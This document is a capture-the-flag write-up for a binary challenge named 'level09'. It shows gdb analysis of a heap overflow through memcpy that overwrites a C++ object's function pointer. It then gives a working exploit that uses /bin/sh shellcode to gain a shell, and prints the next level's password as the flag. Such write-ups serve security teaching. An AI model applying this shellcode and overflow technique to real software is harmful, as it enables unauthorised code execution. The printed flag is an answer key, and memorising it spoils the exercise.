# level09

## disassemble

```shell
objdump -dC -M intel level9 > source.txt
# objdump --disassemble --demangle --disassembler-options intel level9 > source.txt
```

## find_a_vulnerability

### get_first_address_of_the_heap

```shell
gdb level9

# 8048617:	e8 14 ff ff ff       	call   8048530 <operator new(unsigned int)@plt>
# 804861c:	89 c3                	mov    ebx,eax
(gdb) break *0x804861c
(gdb) run BBBB
(gdb) info registers
eax            0x804a008	134520840
```

The fisrst address : `0x804a008`

### memcpy_to_edx

#### call_edx

```
080485f4 <main>:
 [...]
 8048693:       ff d2                   call   edx
 [...]
```

#### memcpy's_vulnerability

* write on heap

```shell
gdb level9
# 8048733:	e8 d8 fd ff ff       	call   8048510 <memcpy@plt>
# 8048738:	c9                   	leave
(gdb) break *0x8048738
(gdb) run BBBB
(gdb) x/42x 0x804a008
0x804a008:	0x08048848	0x42424242	0x00000000	0x00000000
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000005	0x00000071
0x804a078:	0x08048848	0x00000000	0x00000000	0x00000000
0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a8:	0x00000000	0x00000000
```

* segmentation fault

```bash
python2.7 -c 'print("BBBB" * 27)' > /tmp/exploit.txt
gdb level9
(gdb) run $(cat /tmp/exploit.txt)
Starting program: /home/user/level9/level9 $(cat /tmp/exploit.txt)
[Inferior 1 (process 6537) exited with code 0110]
```

```bash
python2.7 -c 'print("BBBB" * 28)' > /tmp/exploit.txt
gdb level9
(gdb) run $(cat /tmp/exploit.txt)
Starting program: /home/user/level9/level9 $(cat /tmp/exploit.txt)

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) x/42x 0x804a008
0x804a008:	0x08048848	0x42424242	0x42424242	0x42424242
0x804a018:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a028:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a038:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a048:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a058:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a068:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a078:	0x42424242	0x00000000	0x00000000	0x00000000
0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a8:	0x00000000	0x00000000
```

```
First address       : `0x804a008 + 4` --> `0x804a00c` --> "\x0c\xa0\x04\x08"
Second address      : `0x804a008 + 8` --> `0x804a010` --> "\x50\x88\x04\x08"
Segfault's address	: `0x804a078`
```


## exploit

* shellcode (https://www.exploit-db.com/exploits/42428) : `\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`

```shell
python2.7 -c 'print( "" \
        + "\x10\xa0\x04\x08" \
        "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"  \
        + ("...." * 20) \
        + "\x0c\xa0\x04\x08" \
        )'\
        > /tmp/exploit.txt
./level9 $(cat /tmp/exploit.txt)
```

## flag

```shell
cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```